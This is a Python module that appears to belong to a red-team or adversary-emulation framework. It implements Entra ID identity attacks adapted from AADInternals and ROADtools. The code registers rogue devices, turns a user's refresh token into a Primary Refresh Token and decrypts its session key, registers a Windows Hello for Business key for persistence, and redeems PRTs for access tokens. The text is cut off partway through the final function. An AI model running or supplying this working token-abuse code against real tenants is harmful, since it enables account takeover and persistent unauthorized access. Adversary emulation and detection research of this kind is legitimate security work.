import base64
import json
import logging
import os
import struct
import time
import uuid
from datetime import datetime, timedelta

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
from cryptography.hazmat.primitives.asymmetric import padding as apadding
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cipher_modes
import jwt

BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'


def _build_transport_key_blob(public_key):
    # DRS expects the TransportKey as a base64 Windows CNG BCRYPT_RSAPUBLIC_BLOB,
    # not a PEM/DER key. AADInternals reuses the device's own key pair for this
    # which is what we do here too.
    # https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1#L98
    numbers = public_key.public_numbers()
    modulus = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")

    header = struct.pack(
        "<6I",
        BCRYPT_RSAPUBLIC_MAGIC,
        len(modulus) * 8,  # BitLength
        len(exponent),     # cbPublicExp
        len(modulus),      # cbModulus
        0,                 # cbPrime1 (unused for public key)
        0,                 # cbPrime2 (unused for public key)
    )
    return base64.b64encode(header + exponent + modulus).decode()


def _artifact_write_path(params, filename):
    """Where a technique writes a file it produces (a device .key/.p7b, a WHfB
    key). With --artifact-dir set, the engine passes it through as
    ``_artifact_dir``; a relative name is placed there so it sits beside the
    run's JSON outputs and a later step's ``${x.key_path}`` reference resolves.
    An absolute path is left exactly as the caller set it."""
    run_dir = params.get("_artifact_dir")
    if run_dir and filename and not os.path.isabs(filename):
        os.makedirs(run_dir, exist_ok=True)
        return os.path.join(run_dir, filename)
    return filename


def _artifact_read_path(params, filename):
    """Where a technique looks for a file an earlier step wrote. Prefer the path
    as given; if that misses and --artifact-dir is set, try the same name under
    it, so a standalone step with a literal ``key_path:`` still finds a file a
    previous run left in the artifact dir. Falls back to the original path so
    the caller's ``open()`` raises a clear error."""
    if filename and os.path.isfile(filename):
        return filename
    run_dir = params.get("_artifact_dir")
    if run_dir and filename and not os.path.isabs(filename):
        candidate = os.path.join(run_dir, filename)
        if os.path.isfile(candidate):
            return candidate
    return filename


def register_device(auth_config, params, token=False):
    """
    Registers a new device object in Entra ID via the Device Registration Service (DRS)

    Requires an access token scoped for the Device Registration Service
    Based on AADInternals PRT_Utils.ps1 register_device function
	https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1
    """
    logging.info("Running the register_device technique")

    access_token = token.get("access_token") if token else None
    if not access_token:
        logging.error("A DRS-scoped access token is required to register a device.")
        return

    tenant_domain = params.get("tenant_domain")
    if not tenant_domain:
        logging.error("tenant_domain parameter is required (e.g. contoso.onmicrosoft.com).")
        return

    device_name = params.get("device_name", "DESKTOP-MSINVADER")
    os_version = params.get("os_version", "10.0.19041.928")
    join_type = params.get("join_type", 4)  # 4 = Azure AD register, 0 = Azure AD join

    device_id = str(uuid.uuid4())

    # This key pair is the device's identity going forward - it signs the CSR now
    # and later authenticates PRT requests, so it must be persisted, not discarded.
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, device_id)]))
        .sign(private_key, hashes.SHA256())
    )
    csr_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()

    url = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json; charset=utf-8",
    }

    transport_key_b64 = _build_transport_key_blob(private_key.public_key())

    body = {
        "CertificateRequest": {
            "Type": "pkcs10",
            "Data": csr_b64,
        },
        "Attributes": {
            "ReuseDevice": "True",
            "ReturnClientSid": "True",
            "SharedDevice": "False",
        },
        "TransportKey": transport_key_b64,
        "TargetDomain": tenant_domain,
        "DeviceDisplayName": device_name,
        "DeviceType": "Windows",
        "OSVersion": os_version,
        "JoinType": join_type,
    }

    try:
        response = requests.post(url, headers=headers, json=body)
    except Exception as e:
        logging.error(f"Exception during device registration: {e}")
        return

    if response.status_code not in (200, 201):
        logging.error(f"Device registration failed: {response.status_code} {response.text}")
        return

    result = response.json()
    cert_b64 = result.get("Certificate", {}).get("RawBody")
    returned_device_id = result.get("DeviceId", device_id)

    if not cert_b64:
        logging.error(f"Device registration response did not include a certificate: {result}")
        return

    key_path = _artifact_write_path(params, params.get("key_out", f"{returned_device_id}_device.key"))
    cert_path = _artifact_write_path(params, params.get("cert_out", f"{returned_device_id}_device.p7b"))

    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    with open(cert_path, "wb") as f:
        f.write(base64.b64decode(cert_b64))

    logging.info(f"Registered device '{device_name}' with DeviceId {returned_device_id}")
    logging.info(f"Device private key saved to {key_path}, device certificate saved to {cert_path}")

    # Only serializable values here: the output dict is written to
    # --artifact-dir as JSON. The private key lives on disk at key_path, which
    # is what every downstream step loads it from.
    return {
        "device_id": returned_device_id,
        "certificate_b64": cert_b64,
        "key_path": key_path,
        "cert_path": cert_path,
    }


def get_prt_with_refresh_token(params):
	"""
	Request a Primary Refresh Token (PRT) using device credentials + refresh token.

	Uses a devices certificate and private key
	plus a user's refresh token to authenticate and obtain a PRT + session key.

	Based on ROADtools deviceauth.py:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L988

	"""
	logging.info("Running the request_prt technique")

	# Load device credentials
	key_path = _artifact_read_path(params, params.get("key_path"))
	cert_path = _artifact_read_path(params, params.get("cert_path"))
	session = params.get("session", "nosession")
	tenant_id = params.get("tenant_id", "common")
	refresh_token = params.get("refresh_token")

	if not key_path or not cert_path:
		logging.error("key_path and cert_path parameters are required")
		return

	# Load private key
	try:
		with open(key_path, "rb") as f:
			private_key_pem = f.read()
		private_key = serialization.load_pem_private_key(
			private_key_pem,
			password=None,
			backend=default_backend()
		)
	except Exception as e:
		logging.error(f"Failed to load private key from {key_path}: {e}")
		return

	# Load certificate
	try:
		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			certificate = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse certificate with cryptography, continuing with binary data")
			certificate = None
	except Exception as e:
		logging.error(f"Failed to load certificate from {cert_path}: {e}")
		return

	# Extract device ID from certificate subject
	device_id = None
	if certificate:
		try:
			for attr in certificate.subject:
				if attr.oid == x509.oid.NameOID.COMMON_NAME:
					device_id = attr.value
					break
		except Exception as e:
			logging.warning(f"Failed to extract device ID from certificate: {e}")

	if not device_id:
		logging.error("Could not extract device ID from certificate subject")
		return

	logging.info(f"Using device {device_id} to request PRT")

	# STEP 1: Get nonce via srv_challenge grant type
	# Following ROADtools approach
	logging.debug("Step 1: Requesting nonce via srv_challenge")

	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	# AAD Broker Plugin client ID
	aad_broker_client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"

	# Request nonce
	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": aad_broker_client_id,
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			logging.debug(f"Response: {nonce_response.text[:200]}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error(f"No nonce received from srv_challenge")
			return

		logging.debug(f"Nonce obtained: {nonce[:20]}...")

	except Exception as e:
		logging.error(f"Exception during srv_challenge: {e}")
		return

	# STEP 2: Create signed JWT with device certificate
	logging.debug("Step 2: Creating signed JWT with refresh token + device certificate")

	try:
		os_version = "10.0.19041.868"  # Default Windows version

		# JWT payload per ROADtools deviceauth.py:988
		jwt_payload = {
			"client_id": aad_broker_client_id,
			"request_nonce": nonce,
			"scope": "openid aza ugs",
			"group_sids": [],
			"win_ver": os_version,
			"grant_type": "refresh_token",
			"refresh_token": refresh_token,  # User's refresh token - REQUIRED
		}

		# Include certificate in x5c header (base64-encoded, NOT as array for this flow)
		cert_b64 = base64.b64encode(cert_data).decode()

		# Sign JWT with device private key using RS256
		# Per ROADtools: x5c should be the cert, kdf_ver is required
		jwt_token = jwt.encode(
			jwt_payload,
			private_key,
			algorithm="RS256",
			headers={
				"x5c": cert_b64,
				"kdf_ver": 2,
			}
		)

		logging.debug(f"Device JWT created: {jwt_token[:80]}...")

	except Exception as e:
		logging.error(f"Failed to create device JWT: {e}")
		return

	# STEP 3: Submit signed JWT to get PRT
	logging.debug("Step 3: Submitting JWT to obtain PRT (refresh_token upgrade)")

	prt_body = {
		"windows_api_version": "2.2",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": jwt_token,
		"client_info": "1",
		"tgt": True,
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	# Check response
	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
			logging.debug(f"Full response: {prt_response.text[:500]}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Extract PRT components from response
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error(f"PRT response did not include session_key_jwe")
		logging.debug(f"Response keys: {list(result.keys())}")
		return

	# Decrypt session_key_jwe to get the actual session key for later use
	logging.debug("Decrypting session key for storage")
	try:
		session_key = _decrypt_jwe_with_private_key(session_key_jwe, private_key)
		if not session_key:
			logging.error("Failed to decrypt session key from PRT response")
			return
		logging.debug("   Session key decrypted and ready for storage")
	except Exception as e:
		logging.error(f"Failed to decrypt session key: {e}")
		return

	output = {
		"device_id": device_id,
		"session_key": base64.b64encode(session_key).decode('utf-8'),
		"tgt_ad": tgt_ad,
		"tgt_cloud": tgt_cloud,
		"refresh_token": refresh_token,
		"id_token": result.get("id_token"),
		"obtained_at": datetime.utcnow().isoformat(),
		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
	}

	logging.info(f"Successfully obtained PRT for device {device_id}")
	return output


def get_prt_with_refresh_token_v2(params):
	"""
	Request a Primary Refresh Token (PRT) using device credentials + refresh token.

	v2.0 counterpart of get_prt_with_refresh_token: hits ``/oauth2/v2.0/token``
	and the signed request carries ``prt_protocol_version=3.0`` instead of
	``windows_api_version``. Under the hood this is ROADtools' PRT protocol v3
	(get_prt_with_refresh_token_v3).

	Uses a devices certificate and private key
	plus a user's refresh token to authenticate and obtain a PRT + session key.

	Based on ROADtools deviceauth.py:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L988

	"""
	logging.info("Running the request_prt technique")

	# Load device credentials
	key_path = _artifact_read_path(params, params.get("key_path"))
	cert_path = _artifact_read_path(params, params.get("cert_path"))
	session = params.get("session", "nosession")
	tenant_id = params.get("tenant_id", "common")
	refresh_token = params.get("refresh_token")

	if not key_path or not cert_path:
		logging.error("key_path and cert_path parameters are required")
		return

	# Load private key
	try:
		with open(key_path, "rb") as f:
			private_key_pem = f.read()
		private_key = serialization.load_pem_private_key(
			private_key_pem,
			password=None,
			backend=default_backend()
		)
	except Exception as e:
		logging.error(f"Failed to load private key from {key_path}: {e}")
		return

	# Load certificate
	try:
		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			certificate = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse certificate with cryptography, continuing with binary data")
			certificate = None
	except Exception as e:
		logging.error(f"Failed to load certificate from {cert_path}: {e}")
		return

	# Extract device ID from certificate subject
	device_id = None
	if certificate:
		try:
			for attr in certificate.subject:
				if attr.oid == x509.oid.NameOID.COMMON_NAME:
					device_id = attr.value
					break
		except Exception as e:
			logging.warning(f"Failed to extract device ID from certificate: {e}")

	if not device_id:
		logging.error("Could not extract device ID from certificate subject")
		return

	logging.info(f"Using device {device_id} to request PRT")

	# STEP 1: Get nonce via srv_challenge grant type
	# Following ROADtools approach
	logging.debug("Step 1: Requesting nonce via srv_challenge")

	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	# AAD Broker Plugin client ID
	aad_broker_client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"

	# Request nonce
	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": aad_broker_client_id,
	}

	try:
		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			logging.debug(f"Response: {nonce_response.text[:200]}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error(f"No nonce received from srv_challenge")
			return

		logging.debug(f"Nonce obtained: {nonce[:20]}...")

	except Exception as e:
		logging.error(f"Exception during srv_challenge: {e}")
		return

	# STEP 2: Create signed JWT with device certificate
	logging.debug("Step 2: Creating signed JWT with refresh token + device certificate")

	try:
		# JWT payload per ROADtools get_prt_with_refresh_token_v3
		jwt_payload = {
			"client_id": aad_broker_client_id,
			"request_nonce": nonce,
			"scope": "openid aza",
			"grant_type": "refresh_token",
			"refresh_token": refresh_token,  # User's refresh token - REQUIRED
		}

		# Include certificate in x5c header (base64-encoded, NOT as array for this flow)
		cert_b64 = base64.b64encode(cert_data).decode()

		# Sign JWT with device private key using RS256. The v3 flow drops the
		# kdf_ver header the v1 flow sends.
		jwt_token = jwt.encode(
			jwt_payload,
			private_key,
			algorithm="RS256",
			headers={
				"x5c": cert_b64,
			}
		)

		logging.debug(f"Device JWT created: {jwt_token[:80]}...")

	except Exception as e:
		logging.error(f"Failed to create device JWT: {e}")
		return

	# STEP 3: Submit signed JWT to get PRT
	logging.debug("Step 3: Submitting JWT to obtain PRT (refresh_token upgrade)")

	prt_body = {
		"prt_protocol_version": "3.0",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": jwt_token,
		"client_info": "1",
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	# Check response
	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
			logging.debug(f"Full response: {prt_response.text[:500]}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Extract PRT components from response
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error(f"PRT response did not include session_key_jwe")
		logging.debug(f"Response keys: {list(result.keys())}")
		return

	# Decrypt session_key_jwe to get the actual session key for later use
	logging.debug("Decrypting session key for storage")
	try:
		session_key = _decrypt_jwe_with_private_key(session_key_jwe, private_key)
		if not session_key:
			logging.error("Failed to decrypt session key from PRT response")
			return
		logging.debug("   Session key decrypted and ready for storage")
	except Exception as e:
		logging.error(f"Failed to decrypt session key: {e}")
		return

	output = {
		"device_id": device_id,
		"session_key": base64.b64encode(session_key).decode('utf-8'),
		"tgt_ad": tgt_ad,
		"tgt_cloud": tgt_cloud,
		"refresh_token": refresh_token,
		"id_token": result.get("id_token"),
		"obtained_at": datetime.utcnow().isoformat(),
		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
	}

	logging.info(f"Successfully obtained PRT for device {device_id}")
	return output


def _calculate_derived_key_v2(session_key, context, jwtbody):
	"""
	Derive a key from PRT session key using context and JWT body.
	Based on ROADtools calculate_derived_key_v2
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1280
	"""

	digest = hashes.Hash(hashes.SHA256())
	digest.update(context)
	digest.update(jwtbody)
	kdfcontext = digest.finalize()

	label = b"AzureAD-SecureConversation"
	kdf = KBKDFHMAC(
		algorithm=hashes.SHA256(),
		mode=Mode.CounterMode,
		length=32,
		rlen=4,
		llen=4,
		location=CounterLocation.BeforeFixed,
		label=label,
		context=kdfcontext,
		fixed=None,
		backend=default_backend()
	)
	return kdf.derive(session_key)


def _calculate_derived_key_v1(session_key, context):
	"""
	Derive key using v1 (without JWT body).
	Based on ROADtools calculate_derived_key:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1291
	"""
	

	label = b"AzureAD-SecureConversation"
	kdf = KBKDFHMAC(
		algorithm=hashes.SHA256(),
		mode=Mode.CounterMode,
		length=32,
		rlen=4,
		llen=4,
		location=CounterLocation.BeforeFixed,
		label=label,
		context=context,
		fixed=None,
		backend=default_backend()
	)
	return kdf.derive(session_key)


def _decrypt_response_with_derived_key(encrypted_response, session_key):
	"""
	Decrypt encrypted authentication response (JWE format).
	Handles both AES-256-GCM (12-byte IV) and AES-256-CBC (16-byte IV) based on IV length.
	Based on ROADtools auth.py decrypt_auth_response and decrypt_auth_response_derivedkey:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1314
	"""
	

	try:
		def b64_decode(data):
			return base64.urlsafe_b64decode(data + ('=' * (len(data) % 4)))

		# Split JWE into 5 parts: header.enckey.iv.ciphertext.authtag
		parts = encrypted_response.split('.')
		if len(parts) != 5:
			logging.error(f"Invalid JWE format: expected 5 parts, got {len(parts)}")
			return None

		header_b64, _, iv_b64, ciphertext_b64, authtag_b64 = parts

		# Parse header and extract context
		header = json.loads(b64_decode(header_b64))
		if 'ctx' not in header:
			logging.error("No 'ctx' in JWE header")
			return None

		context = b64_decode(header['ctx'])
		derived_key = _calculate_derived_key_v1(session_key, context)

		# Decode JWE components
		iv = b64_decode(iv_b64)
		ciphertext = b64_decode(ciphertext_b64)
		authtag = b64_decode(authtag_b64)

		# Decrypt based on IV length
		if len(iv) == 12:
			# AES-256-GCM (12-byte nonce)
			aesgcm = AESGCM(derived_key)
			plaintext = aesgcm.decrypt(iv, ciphertext + authtag, header_b64.encode('utf-8'))
		else:
			# AES-256-CBC with PKCS7 padding (typical for Azure)
			
			cipher = Cipher(algorithms.AES(derived_key), cipher_modes.CBC(iv))
			decryptor = cipher.decryptor()
			decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
			unpadder = padding.PKCS7(128).unpadder()
			plaintext = unpadder.update(decrypted_data) + unpadder.finalize()

		return plaintext.decode('utf-8')

	except Exception as e:
		logging.error(f"Failed to decrypt response: {e}")
		return None


def _decrypt_jwe_with_private_key(jwe_token, private_key):
	"""
	Decrypt JWE session_key using device certificate private key (RSA-OAEP).
	Based on ROADtools decrypt_jwe_with_transport_key:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L757
	"""
	try:
		dataparts = jwe_token.split('.')
		if len(dataparts) < 2:
			logging.error("Invalid JWE format")
			return None

		wrapped_key_b64 = dataparts[1]
		wrapped_key_b64 += '=' * ((4 - len(wrapped_key_b64) % 4) % 4)
		wrapped_key = base64.urlsafe_b64decode(wrapped_key_b64)

		unwrapped_key = private_key.decrypt(
			wrapped_key,
			apadding.OAEP(
				mgf=apadding.MGF1(algorithm=hashes.SHA1()),
				algorithm=hashes.SHA1(),
				label=None
			)
		)
		return unwrapped_key

	except Exception as e:
		logging.error(f"Failed to decrypt JWE: {e}")
		return None


def create_whfb_key(params):
	"""
	Create and register a Windows Hello for Business key with Entra ID.

	Generates a new RSA 2048-bit key pair locally and registers it with Entra ID's
	enrollment service, making it available for device authentication via PRT flows.

	Based on ROADtools register_winhello_key pattern:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L800

	Parameters:
		session: Authentication session name with access token
		key_out: Output path for private key (optional)

	Returns:
		Dictionary with registered key details including key ID
	"""
	logging.info("Running the create_whfb_key technique")

	access_token = params.get("access_token")
	if not access_token:
		logging.error("access_token is required to register Windows Hello key")
		return

	# Step 1: Generate RSA 2048-bit keypair for Windows Hello
	logging.debug("Step 1: Generating RSA 2048-bit keypair for Windows Hello")
	try:
		whfb_key = rsa.generate_private_key(
			public_exponent=65537,
			key_size=2048,
			backend=default_backend()
		)
		logging.debug("   Generated Windows Hello keypair")
	except Exception as e:
		logging.error(f"Failed to generate Windows Hello key: {e}")
		return

	# Step 2: Build public key blob in CNG format for Entra ID
	logging.debug("Step 2: Building CNG public key blob")
	try:
		public_key_blob = _build_transport_key_blob(whfb_key.public_key())
		logging.debug("   Created public key blob (CNG format)")
	except Exception as e:
		logging.error(f"Failed to build public key blob: {e}")
		return

	# Step 3: Register public key with Entra ID EnrollmentServer
	logging.debug("Step 3: Registering public key with Entra ID")
	url = "https://enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0"

	headers = {
		"Authorization": f"Bearer {access_token}",
		"Content-Type": "application/json; charset=utf-8",
		"Accept": "application/json",
		"User-Agent": "Dsreg/10.0 (Windows 10.0.19044.1826)",
	}

	# Key registration payload per ROADtools register_winhello_key
	# Simply send the CNG public key blob
	body = {
		"kngc": public_key_blob
	}

	try:
		response = requests.post(url, headers=headers, json=body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during Windows Hello key registration: {e}")
		return

	if response.status_code not in (200, 201):
		logging.error(f"Windows Hello key registration failed: {response.status_code}")
		try:
			error_data = response.json()
			logging.error(f"Error: {error_data.get('error')}")
			logging.error(f"Description: {error_data.get('error_description')}")
		except:
			logging.error(f"Response: {response.text[:200]}")
		return

	logging.debug("   Successfully registered Windows Hello key with Entra ID")

	# Step 4: Save private key to disk for later use
	logging.debug("Step 4: Persisting private key to disk")
	key_out = _artifact_write_path(params, params.get("key_out", "whfb_private.key"))

	try:
		with open(key_out, "wb") as f:
			f.write(whfb_key.private_bytes(
				encoding=serialization.Encoding.PEM,
				format=serialization.PrivateFormat.PKCS8,
				encryption_algorithm=serialization.NoEncryption(),
			))
		logging.info(f"   Windows Hello private key saved to {key_out}")
	except Exception as e:
		logging.error(f"Failed to save private key: {e}")
		return

	# Step 5: Return registration confirmation
	logging.info(f" Windows Hello for Business key successfully registered")

	return {
		"status": " Windows Hello key registered",
		"key_path": key_out,
		"public_key_blob": public_key_blob,
		"note": "Key is now registered with Entra ID and ready for PRT authentication"
	}


def get_token_with_prt(params):
	"""
	Use a saved PRT to obtain an access token for a specific resource/client.

	Loads a pre-decrypted PRT session key from disk and uses it to sign requests
	and decrypt responses for token acquisition.

	Based on ROADtools aad_brokerplugin_prt_auth pattern:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037

	1. Get nonce from srv_challenge
	3. Create JWT payload signed with derived key
	4. Submit to token endpoint
	5. Decrypt response to extract access token

	Parameters:
		prt: Primary Refresh Token (the PRT refresh_token) to redeem
		session_key: base64 decrypted PRT session key
		client_id: Client ID to request token for
		resource: Resource/scope to request access to
		tenant_id: Tenant ID
	"""
	logging.info("Running the get_token_with_prt technique")

	prt = params.get("prt")
	session_key_b64 = params.get("session_key")
	client_id = params.get("client_id")
	resource = params.get("resource")
	tenant_id = params.get("tenant_id", "common")

	if not all([prt, session_key_b64, client_id, resource]):
		logging.error("prt, session_key, client_id, and resource parameters are required")
		return

	try:
		session_key = base64.b64decode(session_key_b64)
	except Exception as e:
		logging.error(f"Failed to decode session_key: {e}")
		return

	# Step 2: Request nonce from srv_challenge
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error("No nonce received")
			return

	except Exception as e:
		logging.error(f"Exception during nonce request: {e}")
		return

	# Step 3: Create JWT payload signed with derived key
	now = int(time.time())
	jwt_payload = {
		"client_id": client_id,
		"request_nonce": nonce,
		"scope": "openid",
		"resource": resource,
		"grant_type": "refresh_token",
		"refresh_token": prt,
		"win_ver": "10.0.19041.868",
		"aud": "login.microsoftonline.com",
		"iss": "aad:brokerplugin",
		"iat": now,
		"exp": now + 3600,
	}

	# Create temp JWT to extract body for KDF
	jwt_context = os.urandom(24)
	headers_for_temp = {
		'ctx': base64.b64encode(jwt_context).decode('utf-8'),
		'kdf_ver': 2
	}

	try:
		temp_jwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=headers_for_temp)
		jbody = temp_jwt.split('.')[1]
		jwtbody = base64.urlsafe_b64decode(jbody + ('=' * (len(jbody) % 4)))

		derived_key = _calculate_derived_key_v2(session_key, jwt_context, jwtbody)
		request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=headers_for_temp)

	except Exception as e:
		logging.error(f"Failed to create/sign JWT: {e}")
		return

	# Step 4: Submit signed JWT to token endpoint
	token_body = {
		'windows_api_version': '2.2',
		'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
		'request': request_jwt,
		'client_info': '1'
	}

	try:
		token_response = requests.post(token_endpoint, headers=headers, data=token_body, timeout=10)

		if token_response.status_code not in (200, 201):
			logging.error(f"Token request failed: {token_response.status_code}")
			try:
				error_data = token_response.json()
				logging.error(f"Error: {error_data.get('error')}")
				logging.error(f"Description: {error_data.get('error_description')}")
			except:
				logging.error(f"Response: {token_response.text[:200]}")
			return

		response_text = token_response.text

		# Step 5: Decrypt response using session key
		plaintext = _decrypt_response_with_derived_key(response_text, session_key)
		if not plaintext:
			logging.error("Failed to decrypt response")
			return

		# Step 6: Parse decrypted response and extract tokens
		try:
			response_data = json.loads(plaintext)
		except Exception as e:
			logging.error(f"Failed to parse decrypted response as JSON: {e}")
			return

		# Extract tokens from response
		output = {
			"status": " Token request successful",
			"client_id": client_id,
			"resource": resource,
			"response_keys": list(response_data.keys()),
		}

		# Extract access token
		if 'access_token' in response_data:
			output["access_token"] = response_data['access_token']
			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")

		for key in ['refresh_token', 'id_token', 'expires_in']:
			if key in response_data:
				output[key] = response_data[key]

		return output

	except Exception as e:
		logging.error(f"Exception during token request: {e}")
		return


def get_token_with_prt_v2(params):
	"""
	Use a saved PRT to obtain an access token for a specific scope/client.

	v2.0 counterpart of get_token_with_prt: hits ``/oauth2/v2.0/token`` with a
	``scope`` in place of the v1.0 ``resource``, and the signed request carries
	``prt_protocol_version=3.0`` instead of ``windows_api_version``.

	Loads a pre-decrypted PRT session key from disk and uses it to sign requests
	and decrypt responses for token acquisition.

	Based on ROADtools aad_brokerplugin_prt_auth_v3 pattern:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037

	1. Get nonce from srv_challenge
	3. Create JWT payload signed with derived key
	4. Submit to token endpoint
	5. Decrypt response to extract access token

	Parameters:
		prt: Primary Refresh Token (the PRT refresh_token) to redeem
		session_key: base64 decrypted PRT session key
		client_id: Client ID to request token for
		scope: v2.0 scope to request access to (e.g. https://graph.microsoft.com/.default)
		tenant_id: Tenant ID
		redirect_uri: optional; only sent if given. Must be a redirect URI
			registered on client_id, or Entra returns AADSTS50011. Not needed
			for a .default scope on a preauthorized first-party client.
	"""
	logging.info("Running the get_token_with_prt_v2 technique")

	prt = params.get("prt")
	session_key_b64 = params.get("session_key")
	client_id = params.get("client_id")
	scope = params.get("scope")
	tenant_id = params.get("tenant_id", "common")
	redirect_uri = params.get("redirect_uri")

	if not all([prt, session_key_b64, client_id, scope]):
		logging.error("prt, session_key, client_id, and scope parameters are required")
		return

	try:
		session_key = base64.b64decode(session_key_b64)
	except Exception as e:
		logging.error(f"Failed to decode session_key: {e}")
		return

	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
	headers = {
